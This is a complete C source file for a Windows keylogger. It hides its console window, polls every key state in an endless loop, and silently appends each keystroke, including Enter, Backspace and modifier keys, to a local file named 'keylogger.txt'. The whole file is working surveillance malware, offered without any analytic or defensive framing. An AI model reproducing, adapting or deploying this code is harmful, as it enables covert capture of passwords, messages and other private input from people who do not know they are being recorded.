#include <windows.h>
#include <stdio.h>
#include <string.h>

// Function to save logs to a file
void save_to(const char *filename, const char *message) {
    FILE *fp = fopen(filename, "a");
    if (fp == NULL) {
        FILE *error_log = fopen("error_log.txt", "a");
        if (error_log != NULL) {
            fprintf(error_log, "Error: Unable to open log file %s\n", filename);
            fclose(error_log);
        }
        return;
    }
    fprintf(fp, "%s", message);
    fclose(fp);
}

// Map special keys with Shift pressed
char map_special_shifted(int key) {
    switch (key) {
        case '1': return '!';
        case '2': return '@';
        case '3': return '#';
        case '4': return '$';
        case '5': return '%';
        case '6': return '^';
        case '7': return '&';
        case '8': return '*';
        case '9': return '(';
        case '0': return ')';
        case '-': return '_';
        case '=': return '+';
        case '[': return '{';
        case ']': return '}';
        case '\\': return '|';
        case ';': return ':';
        case '\'': return '"';
        case ',': return '<';
        case '.': return '>';
        case '/': return '?';
        default: return '\0';
    }
}

int main() {
    HWND hwnd = GetConsoleWindow(); // Get the console window handle
    ShowWindow(hwnd, SW_HIDE);      // Hide the window

    char message[64];       // Buffer for logging messages
    int lastKeyState[256] = {0}; // Array to track key states

    while (1) {
        for (int i = 0; i < 256; i++) {
            // Check if key is pressed
            if (GetAsyncKeyState(i) & 0x0001) {
                // Skip noisy keys that are not typically used
                if (i < 8 || i > 254) continue;

                // Handle alphanumeric keys
                if (i >= 'A' && i <= 'Z') {
                    int capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);
                    int shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000);

                    if (capsLock ^ shiftPressed) { // XOR to determine letter case
                        snprintf(message, sizeof(message), "%c", i); // Uppercase
                    } else {
                        snprintf(message, sizeof(message), "%c", i + 32); // Lowercase
                    }
                }
                // Handle numbers and special characters
                else if (i >= '0' && i <= '9') {
                    if (GetKeyState(VK_SHIFT) & 0x8000) {
                        char shiftedChar = map_special_shifted(i);
                        if (shiftedChar != '\0') {
                            snprintf(message, sizeof(message), "%c", shiftedChar);
                        } else {
                            snprintf(message, sizeof(message), "%c", i); // Default number
                        }
                    } else {
                        snprintf(message, sizeof(message), "%c", i); // Default number
                    }
                }
                // Handle spacebar
                else if (i == VK_SPACE) {
                    strcpy(message, " ");
                }
                // Handle special keys
                else {
                    switch (i) {
                        case VK_RETURN:  strcpy(message, "[Enter]"); break;
                        case VK_BACK:    strcpy(message, "[Backspace]"); break;
                        case VK_TAB:     strcpy(message, "[Tab]"); break;
                        case VK_ESCAPE:  strcpy(message, "[Esc]"); break;
                        case VK_SHIFT:   strcpy(message, "[Shift]"); break;
                        case VK_CONTROL: strcpy(message, "[Ctrl]"); break;
                        case VK_MENU:    strcpy(message, "[Alt]"); break;
                        case VK_CAPITAL: strcpy(message, "[CapsLock]"); break;
                        case VK_LEFT:    strcpy(message, "[Left]"); break;
                        case VK_RIGHT:   strcpy(message, "[Right]"); break;
                        case VK_UP:      strcpy(message, "[Up]"); break;
                        case VK_DOWN:    strcpy(message, "[Down]"); break;
                        case VK_HOME:    strcpy(message, "[Home]"); break;
                        case VK_END:     strcpy(message, "[End]"); break;
                        case VK_DELETE:  strcpy(message, "[Del]"); break;
                        default:
                            snprintf(message, sizeof(message), "[Unknown: %d]", i);
                            break;
                    }
                }

                // Save the keypress to the log file
                save_to("keylogger.txt", message);
            }
        }
        Sleep(10); // Reduce CPU usage
    }

    return 0;
}
